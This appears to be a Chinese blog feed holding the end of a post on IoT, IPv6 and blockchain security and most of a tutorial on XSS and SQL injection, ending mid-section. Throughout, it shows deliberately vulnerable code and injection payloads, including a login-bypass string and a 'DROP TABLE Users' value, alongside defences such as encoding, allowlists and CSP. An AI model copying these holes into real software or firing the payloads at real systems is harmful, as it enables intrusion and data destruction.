换句话说，当底层的硬件被黑客控制之后，我们就无法保障运行在硬件之上的系统和软件的安全性了。</p><p>IoT 的发展，事实上正让物理攻击变得越来越容易。我总结了一张物理攻击的发展过程图，你可以看到，随着 IoT 越来越小、越来越智能，和我们的联系越来越紧密，物理攻击的难度也变得越来越低。在未来，公共区域内的所有设备甚至都有可以成为黑客的囊中之物。</p><p><img src="/images/security/security-linux/23.jpg" alt="23"></p><p>因此，如何对物理攻击进行有效的防控，也是未来安全中需要解决的主要挑战之一。</p><p>目前来说，黑客利用 IoT 设备发起的最主要的攻击还是 DDoS 攻击，即黑客利用海量的 IoT 设备向目标服务器发送巨大的网络流量，导致服务器无法响应正常请求。</p><p>随着 IoT 的发展，黑客能够控制的设备越来越多，能够导致的影响也会越来越大。你一定在很多电影中看到过类似的情景，比如，黑客通过操纵汽车控制医疗设备等方式，导致人员伤亡。</p><p>因此，如何保护 IoT 设备免受黑客的攻击，同样会成为未来安全的主要挑战之一。</p><h3 id="IPv6-对安全的影响"><a href="#IPv6-对安全的影响" class="headerlink" title="IPv6 对安全的影响"></a>IPv6 对安全的影响</h3><p>因为 IPv4 的地址空间短缺问题，IPv6 是国家重点推进的一个技术方向。目前三大运营商已经完成了改造，各大互联网公司也已经接到了兼容 IPv6 的强制要求，我相信国内应该会很快推广和普及 IPv6。</p><p>IPv6 和 IPv4 相比最大区别就是 IP 地址变得非常庞大了。那么，庞大的 IP 地址对于安全来说，又意味着什么呢？</p><p>我认为对于黑客来说，最大的影响就是网络扫描不再可能。</p><p>我们知道，找到攻击目标是黑客发起攻击的第一步。因此，很多黑客会通过扫描网络来发现目标。目前，性能最优的扫描工具是Masscan，它能够在 5 分钟内扫遍全部 IPv4 的地址空间。</p><p>而 IPv6 的地址空间是 IPv4 的 2^96 倍，黑客想要利用现有的扫描工具快速遍历 IPv6 的地址空间，显然是不可能的。因此，黑客就只能通过其他方式去精准定位目标了。除了对黑客有影响以外，庞大的 IP 地址对公司安全来说，也同样是一种负担。</p><p>IP 地址变多就意味着黑客手中的 IP 资源变多了，同时，IPv6 的高变化频率还会让同一个设备的 IP 经常性的发生变化。因此，使用了 IPv6 之后，我们就很难利用黑名单对 IP 进行标记和处罚了。</p><p>另外，仍然有待观察的一点是，IPv6 的复用性是否会比 IPv4 更低。</p><p>IPv4 由于地址匮乏，有很高的复用性（一个学校可能都在共用一个 IP 地址），这让我们很难根据 IP 去定位到一个具体的位置或者人。</p><p>而 IPv6 的地址空间是足够的（每一粒沙子都能分配到一个 IP 地址），因此，IP 复用就不再是一个刚需了。所以，如果 IPv6 的复用性远低于 IPv4 的话，就能让 IP 的定位变得更准确。那么对于安全工作来说，想要找到黑客也会更加容易。</p><h3 id="区块链中的安全问题"><a href="#区块链中的安全问题" class="headerlink" title="区块链中的安全问题"></a>区块链中的安全问题</h3><p>我们都知道，区块链的思想是去中心化，即将数据和算力分散到每一个小的计算节点中，最终，以少数服从多数的形式来完成数据的计算和存储。这实际上是一种对完整性的保障。这么说你可能还不理解，我举个例子。</p><p>以货币为例，我们现在通过支付宝、微信等电子货币来完成日常交易，事实上是将钱交由支付宝和微信这样的中心机构进行集中保管。而对于支付宝、微信来说，理论上是可以对用户的余额进行篡改的，不过，因为受到了多方面限制，这一操作是无法实现的。</p><p>但是在比特币中，因为不存在中心机构，每个用户的余额由所有人共同保管，因此没有任何一个节点可以实现篡改。</p><p>但如果你仔细想想的话，就会发现这种近乎完美的完整性保障，是通过牺牲机密性来完成的。也就是说，在支付宝中，你无法知道其他用户的余额，但是在比特币中，每一笔交易和每一个用户的余额都是公开的信息，因此比特币不提供任何针对机密性的保护措施（比如，你可以在blockchain看到所有的比特币信息）。</p><p>尽管比特币本身的完整性无可挑剔，但仍然无法阻止由于用户个人密钥丢失而导致的资产损失。这就好比你安装了一个特别结实的门，但只要钥匙丢了，门的存在就毫无意义了。事实上，目前大部分的比特币安全事件，都是黑客成功盗取了用户或者公司系统的比特币密钥之后，再去盗取对应账号的余额。</p><p>另外，比特币是目前黑客们主要使用的货币之一。其原因在于，它是匿名的（注意：匿名不是机密性，匿名是指你无法通过比特币的账号，关联到某个具体的人）。这也就保证了，即使警方知道了黑客的账户，也没办法抓到黑客。而且，由于比特币的去中心化，警方也没办法封停黑客的账户，追回被盗的比特币。</p><p>所以，比特币这样一种去中心化且匿名的货币体系，既不保险，也不利于政府的管控，因此国内对于以区块链为基础的电子货币落地，始终不认可。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>极客时间《安全攻防技能30讲》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在开发一个应用的过程中，需要涉及代码、操作系统、网络和数据库等多个方面。所以，只是了解代码安全肯定是不够的，我们还需要了解常见的基础环境和工具中的安全机制，学会通过正确地配置这些安全机制，来提升安全保障。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://xinlichao.cn/categories/Security/"/>
    
    
      <category term="security" scheme="https://xinlichao.cn/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Web 安全</title>
    <link href="https://xinlichao.cn/back-end/security/security-web/"/>
    <id>https://xinlichao.cn/back-end/security/security-web/</id>
    <published>2020-07-12T13:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.682Z</updated>
    
    <content type="html"><![CDATA[<p>Web 安全，是指所有基于 HTTP 或者其他超文本传输协议（RPC 等）开发的应用，包括：网页、App、API 接口等等。这类应用的共同点是：通过 HTTP 等文本协议，在客户端和服务端之间进行数据交换。</p><a id="more"></a><h2 id="XSS-攻击"><a href="#XSS-攻击" class="headerlink" title="XSS 攻击"></a>XSS 攻击</h2><h3 id="XSS-攻击是如何产生的？"><a href="#XSS-攻击是如何产生的？" class="headerlink" title="XSS 攻击是如何产生的？"></a>XSS 攻击是如何产生的？</h3><p>作为最普遍的网页语言，HTML 非常灵活，你可以在任意时候对 HTML 进行修改。但是，这种灵活性也给了黑客可趁之机：通过给定异常的输入，黑客可以在你的浏览器中，插入一段恶意的 JavaScript 脚本，从而窃取你的隐私信息或者仿冒你进行操作。这就是 XSS 攻击（Cross-Site Scripting，跨站脚本攻击）的原理。</p><p>三种 XSS 攻击，它们分别是：反射型 XSS、基于 DOM 的 XSS 以及持久型 XSS。</p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>假设现在有一个搜索网页，当你输入任意一个关键词，并点击“搜索”按钮之后，这个网页就会给你展示“你搜索的结果内容是：XXX”。</p><p>以 PHP 为例，这个网页的服务端实现逻辑如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form role=<span class="string">"search"</span> action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"text"</span> name=<span class="string">"search"</span> placeholder=<span class="string">"请输入要搜索的内容"</span>&gt;</span><br><span class="line">          &lt;button type=<span class="string">"submit"</span>&gt;搜索&lt;/button&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'search'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'search'</span>])) &#123;</span><br><span class="line">        $search = $_GET[<span class="string">'search'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;你搜索的结果内容是："</span> . $search . <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这段代码的逻辑是将搜索框输入的内容，拼接成字符串，然后填充到最终的 HTML 中。而且这个过程中没有任何的过滤措施，如果黑客想要对这个过程发起攻击，他会输入下面这行代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><p>黑客输入这段字符后，网页会弹出一个告警框（我自己测试的时候，发现部分浏览器，如 Safari 不会弹出告警框，这是因为浏览器自身提供了一定的 XSS 保护功能）。</p><p>这就是我们所说的反射型 XSS 攻击的过程。其实它攻击的原理很简单。我们可以总结一下，即通过开头的<code>&lt;/h3&gt;</code>和结尾的<code>&lt;h3&gt;</code>，将原本的<code>&lt;h3&gt;</code>标签进行闭合，然后中间通过<code>&lt;script&gt;</code>标签插入 JavaScript 代码并执行，就完成了整个反射型 XSS 的流程。</p><p>你可以注意一下浏览器的地址：<code>http://localhost/index.php?search=&lt;%2Fh3&gt;&lt;script&gt;alert(&#39;xss&#39;)%3B&lt;%2Fscript&gt;&lt;h3&gt;</code> 。实际上，任何人只要点击了这个链接，就会执行一段黑客定义的 JavaScript 脚本。所以，我们经常说，不要点击任何未知的链接。</p><p>反射型 XSS 的总体流程看下面这张图。黑客诱导你点击了某个链接，这个链接提供的服务，可能就是上述的搜索功能。网页在解析到链接的参数后，执行正常的搜索逻辑，但是因为漏洞，网页中被填入了黑客定义的脚本。使得用户的浏览器，最终执行的是黑客的脚本。</p><p><img src="/images/security/security-web/1.jpg" alt="1"></p><h3 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a>基于 DOM 的 XSS</h3><p>反射型 XSS 产生在前后端一体的网页应用中，服务端逻辑会改变最终的网页代码。但是，目前更流行的其实是前后端分离，这样网页的代码不会受服务端影响。那么，这样是不是就安全了呢？</p><p>显然不是的。尽管服务端无法改变网页代码，但网页本身的 JavaScript 仍然可以改变。而黑客只要利用了这一点，同样能够在网页中插入自己的脚本。这也就是所谓的基于 DOM 的 XSS 漏洞。</p><p>对于上述搜索功能，通过前后端分离，它的源码就变成了下面这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"search"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"search"</span> <span class="attr">placeholder</span>=<span class="string">"请输入要搜索的内容"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> search = location.search.substring(<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">'你搜索的结果内容是：'</span> + <span class="built_in">decodeURIComponent</span>(search));</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码能够实现和之前的 PHP 代码相同的逻辑：当你在搜索框点击搜索关键词之后，网页会展示你输入的关键词。只不过，HTML 是通过 JavaScript 脚本修改DOM来实现这个功能的。</p><p>那么和上述例子一样，在基于 DOM 的 XSS 中，黑客也可以通过插入一段<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>来执行指定的 JavaScript 脚本。基于 DOM 的 XSS 总体流程如下图所示。可以看到，这个流程其实和反射型 XSS 一致，只是不需要经过服务端了而已。</p><p><img src="/images/security/security-web/2.jpg" alt="2"></p><h3 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h3><p>你可以回想一下，当你在网页中搜索一个关键词时，实际上与这个关键词相关的所有搜索结果都会被展示出来。一旦这些搜索结果中，包含黑客提供的某个恶意 JavaScript 脚本，那么只要我们浏览了这个网页，就有可能会执行这些脚本。这就是持久型 XSS。因为这些恶意的搜索结果，会长期保存在服务端数据库中，所以它又叫作存储型 XSS。在应用中，存储用户的输入并对它们进行展示的地方，都可能出现持久型 XSS。比如：搜索结果、评论、博文等等。</p><p>有了前面的铺垫，持久型 XSS 的产生过程就很好理解了。</p><p><img src="/images/security/security-web/3.jpg" alt="3"></p><p>相比前面两种 XSS 攻击来说，持久型 XSS 往往具备更强的危害性。因为对于一个反射型或者基于 DOM 的 XSS 来说，需要黑客诱导用户点击恶意的 URL，才能够成功地在用户浏览器上执行 JavaScript 脚本。这对黑客在诱导用户操作方面的能力提出了考验：并不是所有的用户都是小白，一些有经验的用户会在点击链接前进行一定的考虑。</p><p>而持久型 XSS 则不同，它是将恶意的 JavaScript 脚本写入到了正常的服务端数据库中，因此，只要用户正常的使用业务功能，就会被注入 JavaScript 脚本。所以说，持久型 XSS 在传播速度和传播范围上，会远远超出其他类型的 XSS。</p><h3 id="通过-XSS-攻击，黑客能做什么？"><a href="#通过-XSS-攻击，黑客能做什么？" class="headerlink" title="通过 XSS 攻击，黑客能做什么？"></a>通过 XSS 攻击，黑客能做什么？</h3><h4 id="窃取-Cookie"><a href="#窃取-Cookie" class="headerlink" title="窃取 Cookie"></a>窃取 Cookie</h4><p>从上面的例子中，我们可以看到，黑客可以窃取用户的 Cookie。因为黑客注入的 JavaScript 代码是运行在 server.com 这个域名下的，因此，黑客可以在 JavaScript 中通过 document.cookie 获得 Cookie 信息。</p><p>另外，需要我们注意的是，受SOP（Same Origin Policy，同源策略）保护，我们在 server.com 中是无法直接向 hacker.com 发送 GET 或者 POST 请求的。这也是为什么，在上面的例子中，我们需要通过 window.location 来执行跳转操作，间接地将 Cookie 信息发送出去。除了 window.location 之外，我们还可以通过加载 JavaScript 文件、图片等方式，向 attacker.com 发送带有 Cookie 的 GET 请求。</p><h4 id="未授权操作"><a href="#未授权操作" class="headerlink" title="未授权操作"></a>未授权操作</h4><p>除了窃取敏感信息以外，黑客还可以利用 JavaScript 的特性，直接代替用户在 HTML 进行各类操作。</p><p>如：黑客就利用 JavaScript 脚本，让用户发送了一个微博，微博中同时还带有反射型 XSS 的链接。这样一来，每个点击链接的用户都会通过微博的形式，诱导更多的用户点击链接，一传十、十传百，造成大范围的传播。</p><h4 id="按键记录和钓鱼"><a href="#按键记录和钓鱼" class="headerlink" title="按键记录和钓鱼"></a>按键记录和钓鱼</h4><p>窃取 Cookie 和未授权操作都是我们很容易想到的危害，除此之外，JavaScript 还能做什么呢？</p><p>JavaScript 的功能十分强大，它还能够记录用户在浏览器中的大部分操作。比如：鼠标的轨迹、键盘输入的信息等。也就是说，你输入的账号名和密码，都可以被 JavaScript 记录下来，从而被黑客获取到。</p><p>另外，即使某个存在 XSS 漏洞的页面不具备任何输入框，黑客还可以通过修改 DOM，伪造一个登录框，来诱导用户在本不需要登录的页面，去输入自己的用户名和密码。这也是“钓鱼”的一种形式，在这个过程中用户访问的域名是完全正常的，只是页面被篡改了，所以具备更高的迷惑性。</p><h3 id="如何进行-XSS-防护？"><a href="#如何进行-XSS-防护？" class="headerlink" title="如何进行 XSS 防护？"></a>如何进行 XSS 防护？</h3><h4 id="验证输入-OR-验证输出"><a href="#验证输入-OR-验证输出" class="headerlink" title="验证输入 OR 验证输出"></a>验证输入 OR 验证输出</h4><p>防护的核心原则是：一切用户输入皆不可信。你的第一反应一定是，这很好实现啊，当接收到用户的输入时，我们就进行验证，这不就做到了吗？实际上并不是这么简单的，我们还是通过搜索这个例子来看。在用户点击“搜索”按钮之后，如果我们马上对他输入的内容进行验证，这样就会产生两个问题。</p><ol><li>你将无法保存用户的原始输入信息。这样一来，当出现了 Bug 或者想要对黑客行为进行溯源时，你只能“推断”，而不能准确地获取用户的原始输入。</li><li>用户的内容可能会被多种语言获取和使用，提前编码或者处理，将产生未知的问题。比如，在旧版本的 PHP 中，就存在“magic quotes”的漏洞，因为 PHP 无法处理某些编码的字符而导致崩溃。</li></ol><p>因此，我更推荐在需要输出的时候去进行验证，即当需要展示的时候，我们再对内容进行验证，这样我们就能够根据不同的环境去采取不同的保护方案了。</p><p>在 HTML 中，常见的 XSS 注入点我已经总结好了，你可以看下面这个表格：</p><p><img src="/images/security/security-web/4.jpg" alt="4"></p><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>现在，我们已经理解了，XSS 防护的核心原则就是验证，那具体该怎么去做验证呢？我认为，我们可以优先采用编码的方式来完成。所谓编码，就是将部分浏览器识别的关键词进行转换（比如 &lt; 和 &gt;），从而避免浏览器产生误解。对于客户端来说，编码意味着，使用 JavaScript 提供的功能对用户内容进行处理。具体的方法我也总结了一下，你可以看这个表格。</p><p><img src="/images/security/security-web/5.jpg" alt="5"></p><h4 id="检测和过滤"><a href="#检测和过滤" class="headerlink" title="检测和过滤"></a>检测和过滤</h4><p>但是，在很多时候，编码会对网页实际的展现效果产生影响。比如，原本用户可能想展示一个 1&gt;0，却被编码展示成了 1&amp;gt0。尽管网络环境安全了，却对用户造成了困扰。那么，我们还可以采取哪些方法进行验证呢？</p><p>首先，我们需要对用户的内容进行检测。在这里，我们可以采用黑名单和白名单的规则。黑名单往往是我们最直接想到的方法：既然黑客要插入<code>&lt;javascript&gt;</code>标签，那么我们就检测用户内容中是否存在<code>&lt;javascript&gt;</code>标签就好了。</p><p>但是，黑客的攻击方法是无穷无尽的。你检测了<code>&lt;javascript&gt;</code>，黑客就可以改成<code>&lt;JavaScript&gt;</code>（因为 HTML 标签对大小写不敏感），甚至有些时候还能够编码成<code>&amp;#106;avascript</code>等等。另外，HTML5 的发展速度很快，总是有新的标签被开发出来，这些新标签中也可能包含新的注入点。因此，黑名单的更新和维护过程，是需要我们和黑客进行长期对抗的过程。</p><p>所以，在检测中，我更推荐使用白名单的规则。因为白名单的规则比较简单，并且十分有效。比如，在只输入一个分数的地方，规定只有整型变量是合法的。这样一来，你就能够检测出 99.99% 的攻击行为了。</p><p>那当发现某个用户的内容可能存在 XSS 攻击脚本时，这个时候，处理选项有两个：拒绝或者过滤。毫无疑问，拒绝是最安全的选项。一旦你发现可能的 XSS 攻击脚本，只要不将这段用户内容展现出来，就能避免可能的攻击行为。</p><p>但是，拒绝会阻碍用户的使用流程，从用户体验的角度上来考虑的话，过滤会更被用户所接受。上面提到的编码就属于一种过滤的方式。除此之外，我们也可以直接对敏感字符进行替换删除等。需要注意的是，在替换的时候，一定不能采取黑名单的形式（比如：将 javascript 进行删除，那黑客就可以通过 JavaScript 来绕过），而是应该采取白名单的形式（比如，除了 div 之外的标签全部删除）。</p><p>同样地，过滤的流程也必须彻底。比如，我看到过有人采用下面这行字符串来过滤 javascript 标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str=str_replace(<span class="string">'&lt;javascript&gt;'</span>,<span class="string">''</span>,$str);</span><br></pre></td></tr></table></figure><p>但黑客只需要将 str 的值变成<code>&lt;java&lt;javascript&gt;script&gt;</code>就可以了，因为<code>str_replace(&#39;&lt;javascript&gt;&#39;,&#39;&#39;,&#39;&lt;java&lt;javascript&gt;script&gt;&#39;)</code>的结果就是<code>&lt;javascript&gt;</code>。</p><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>面对 XSS 这样一个很普遍的问题，W3C 提出了 CSP（Content Security Policy，内容安全策略）来提升 Web 的安全性。所谓 CSP，就是在服务端返回的 HTTP header 里面添加一个 Content-Security-Policy 选项，然后定义资源的白名单域名。浏览器就会识别这个字段，并限制对非白名单资源的访问。</p><p>配置样例如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src ‘none’; script-src ‘self’; </span><br><span class="line">connect-src ‘self’; img-src ‘self’; style-src ‘self’;</span><br></pre></td></tr></table></figure><p>那我们为什么要限制外域资源的访问呢？这是因为 XSS 通常会受到长度的限制，导致黑客无法提交一段完整的 JavaScript 代码。为了解决这个问题，黑客会采取引用一个外域 JavaScript 资源的方式来进行注入。除此之外，限制了外域资源的访问，也就限制了黑客通过资源请求的方式，绕过 SOP 发送 GET 请求。目前，CSP 还是受到了大部分浏览器支持的，只要用户使用的是最新的浏览器，基本都能够得到很好的保护。</p><p><strong>小结</strong></p><p>简单来说，XSS 就是利用 Web 漏洞，在用户的浏览器中执行黑客定义的 JavaScript 脚本，这样一种攻击方式。根据攻击方式的不同，可以分为：反射型 XSS、基于 DOM 的 XSS 和持久型 XSS。通过在用户的浏览器中注入脚本，黑客可以通过各种方式，采集到用户的敏感信息，包括：Cookie、按键记录、密码等。</p><p>预防 XSS 主要通过对用户内容的验证来完成。首先，我推荐在需要展示用户内容的时候去进行验证，而不是当用户输入的时候就去验证。在验证过程中，我们优先采用编码的方式来完成。如果编码影响到了业务的正常功能，我们就可以采用白名单的检测和过滤方式来进行验证。除此之外，我们可以根据业务需要，配置合适的 CSP 规则，这也能在很大程度上降低 XSS 产生的影响。</p><p><img src="/images/security/security-web/6.jpg" alt="6"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL-注入攻击是如何产生的？"><a href="#SQL-注入攻击是如何产生的？" class="headerlink" title="SQL 注入攻击是如何产生的？"></a>SQL 注入攻击是如何产生的？</h3><p>通常来说，我们会将应用的用户信息存储在数据库中。每次用户登录时，都会执行一个相应的 SQL 语句。这时，黑客会通过构造一些恶意的输入参数，在应用拼接 SQL 语句的时候，去篡改正常的 SQL 语意，从而执行黑客所控制的 SQL 查询功能。这个过程，就相当于黑客“注入”了一段 SQL 代码到应用中。这就是我们常说的 SQL 注入。</p><p>SQL 注入方式</p><h4 id="修改-WHERE-语句"><a href="#修改-WHERE-语句" class="headerlink" title="修改 WHERE 语句"></a>修改 WHERE 语句</h4><p>我们先来看一个例子。现在有一个简单的登录页面，需要用户输入 Username 和 Password 这两个变量来完成登录。具体的 Web 后台代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uName = getRequestString(<span class="string">"username"</span>);</span><br><span class="line">uPass = getRequestString(<span class="string">"password"</span>);</span><br><span class="line">sql = <span class="string">'SELECT * FROM Users WHERE Username ="'</span> + uName + <span class="string">'" AND Password ="'</span> + uPass + <span class="string">'"'</span></span><br></pre></td></tr></table></figure><p>当用户提交一个表单（假设 Username 为 admin，Password 为 123456）时，Web 将执行下面这行代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> Username =<span class="string">"admin"</span> <span class="keyword">AND</span> <span class="keyword">Password</span> =<span class="string">"123456"</span></span><br></pre></td></tr></table></figure><p>用户名密码如果正确的话，这句 SQL 就能够返回对应的用户信息；如果错误的话，不会返回任何信息。因此，只要返回的行数≥1，就说明验证通过，用户可以成功登录。</p><p>所以，当用户正常地输入自己的用户名和密码时，自然就可以成功登录应用。那黑客想要在不知道密码的情况下登录应用，他又会输入什么呢？他会输入 “ or “”=”。这时，应用的数据库就会执行下面这行代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> Username =<span class="string">""</span> <span class="keyword">AND</span> <span class="keyword">Password</span> =<span class="string">""</span> <span class="keyword">or</span> <span class="string">""</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure><p>我们可以看到，WHERE 语句后面的判断是通过 or 进行拼接的，其中””=””的结果是 true。那么，当有一个 or 是 true 的时候，最终结果就一定是 true 了。因此，这个 WHERE 语句是恒为真的，所以，数据库将返回全部的数据。</p><p>这样一来，我们就能解答文章开头的问题了，也就是说，黑客只需要在登录页面中输入 “ or “”=”，就可以在不知道密码的情况下，成功登录后台了。而这，也就是所谓的“万能密码”。而这个“万能密码”，其实就是通过修改 WHERE 语句，改变数据库的返回结果，实现无密码登录。</p><h4 id="执行任意语句"><a href="#执行任意语句" class="headerlink" title="执行任意语句"></a>执行任意语句</h4><p>大部分的数据库都支持多语句执行。在 MySQL 中，实现任意语句执行最简单的方法，就是利用分号将原本的 SQL 语句进行分割。这样，我们就可以一次执行多个语句了。比如，下面这个语句在执行的时候会先插入一个行，然后再返回 Users 表中全部的数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">Users</span> (Username, <span class="keyword">Password</span>) <span class="keyword">VALUES</span>(<span class="string">"test"</span>,<span class="string">"000000"</span>); <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span>;</span><br></pre></td></tr></table></figure><p>接下来，我们来看一个具体的例子。在用户完成登录后，应用通常会通过 userId 来获取对应的用户信息。其 Web 后台的代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid = getRequestString(<span class="string">"userId"</span>);</span><br><span class="line">sql = <span class="string">"SELECT * FROM Users WHERE UserId = "</span> + uid;</span><br></pre></td></tr></table></figure><p>在这种情况下，黑客只要在传入的 userId 参数中加入一个分号，就可以执行任意的 SQL 语句了。比如，黑客想“删库跑路”的话，就令 userId 为 1;DROP TABLE Users，那么，后台实际执行的 SQL 就会变成下面这行代码，而数据库中所有的用户信息就都会被删除。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> UserId = <span class="number">1</span>；<span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span></span><br></pre></td></tr></table></figure><h3 id="通过-SQL-注入攻击，黑客能做什么？"><a href="#通过-SQL-注入攻击，黑客能做什么？" class="headerlink" title="通过 SQL 注入攻击，黑客能做什么？"></a>通过 SQL 注入攻击，黑客能做什么？</h3><h4 id="绕过验证"><a href="#绕过验证" class="headerlink" title="绕过验证"></a>绕过验证</h4><p>在上面的内容中，我们已经介绍过，” or “”=” 作为万能密码，可以让黑客在不知道密码的情况下，通过登录认证。因此，SQL 注入最直接的利用方式，就是绕过验证，也就相当于身份认证被破解了。</p><h4 id="任意篡改数据"><a href="#任意篡改数据" class="headerlink" title="任意篡改数据"></a>任意篡改数据</h4><p>除了绕过验证，我们在任意语句执行的部分中讲到，SQL 注入漏洞导致黑客可以执行任意的 SQL 语句。因此，通过插入 DML 类的 SQL 语句（INSERT、UPDATE、DELETE、TRUNCATE、DROP 等），黑客就可以对表数据甚至表结构进行更改，这样数据的完整性就会受到损害。比如上面例子中，黑客通过插入 DROP TABLE Users，删除数据库中全部的用户。</p><h4 id="窃取数据"><a href="#窃取数据" class="headerlink" title="窃取数据"></a>窃取数据</h4><p>在 XSS 漏洞中，黑客可以通过窃取 Cookie 和“钓鱼”获得用户的隐私数据。那么，在 SQL 注入中，黑客会怎么来获取这些隐私数据呢？</p><p>在各类安全事件中，我们经常听到“拖库”这个词。所谓“拖库”，就是指黑客通过类似 SQL 注入的手段，获取到数据库中的全部数据（如用户名、密码、手机号等隐私数据）。最简单的，黑客利用 UNION 关键词，将 SQL 语句拼接成下面这行代码之后，就可以直接获取全部的用户信息了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> UserId = <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span></span><br></pre></td></tr></table></figure><h4 id="消耗资源"><a href="#消耗资源" class="headerlink" title="消耗资源"></a>消耗资源</h4><p>SQL 注入破坏可用性十分简单，可以通过完全消耗服务器的资源来实现。比如，在 